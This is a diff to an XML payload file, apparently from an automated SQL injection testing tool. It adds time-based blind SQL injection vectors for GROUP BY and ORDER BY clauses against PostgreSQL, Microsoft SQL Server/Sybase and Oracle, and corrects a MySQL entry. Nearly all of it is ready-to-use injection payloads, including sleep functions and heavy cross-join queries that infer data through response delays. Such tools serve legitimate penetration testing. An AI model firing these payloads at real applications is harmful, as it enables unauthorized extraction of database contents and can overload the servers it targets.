@@ -2841,7 +2841,7 @@ Formats:
         <title>MySQL &gt;= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>2</risk>
+        <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
         <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</vector>
@@ -2849,7 +2849,7 @@ Formats:
             <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</payload>
         </request>
         <response>
-            <time>[DELAYED]</time>
+            <time>[SLEEPTIME]</time>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -2858,7 +2858,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 boolean-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <title>MySQL &lt; 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -2875,7 +2875,126 @@ Formats:
             <dbms>MySQL</dbms>
         </details>
     </test>
-    <!-- TODO: add tests for other DBMSes -->
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 time-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clauses</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of time-based blind tests - GROUP BY and ORDER BY clause -->
 
 
